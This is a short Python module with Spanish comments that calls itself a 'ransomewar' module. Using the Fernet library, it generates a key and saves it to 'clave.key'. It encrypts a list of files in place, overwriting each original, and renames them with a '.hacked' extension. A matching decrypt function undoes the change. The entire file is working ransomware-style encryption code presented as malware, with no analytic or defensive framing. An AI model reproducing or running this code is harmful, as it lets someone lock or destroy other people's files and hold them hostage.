from cryptography.fernet import Fernet
import os
# extensión para los archivos cifrados.
EXTENSION= 'hacked'
# generar la clave de cifrado y almacenada en un archivo en el directorio local.
def generate_key():
    key = Fernet.generate_key()
    with open('clave.key', 'wb') as key_file:
        key_file.write(key)

# obtener la clave de cifrado del archivo local.
def get_key():
    with open('clave.key','rb') as file:
        key=file.read()
    return key
# encriptar los archivos
def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        # Abrir el archivo en modo de lectura para leer el contenido
        with open(item, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        # Abrir el archivo en modo de escritura para escribir el contenido cifrado
        with open(item, 'wb') as file:
            file.write(encrypted_data)

        os.rename(item, item + '.' + EXTENSION)
# Función para descifrar los archivos afectados y eliminación de la extensión agregada durante el cifrado.
def decrypt(items, key):
    f = Fernet(key)
    for item in items:
        if item.endswith(EXTENSION):

            item_orig = item.rsplit('.', 1)[0]
            print(item)
            os.rename(item, item_orig)
            item = item_orig

            with open(item, 'rb') as file:
                encrypted_data = file.read()
            # descifrar el contenido cifrado del archivo
            decrypted_data = f.decrypt(encrypted_data)
            with open(item, 'wb') as file:
                file.write(decrypted_data)
        else:
            print('Error decrypting "%s"' %str(item))
#/ EL fin del modulo 'ransomewar'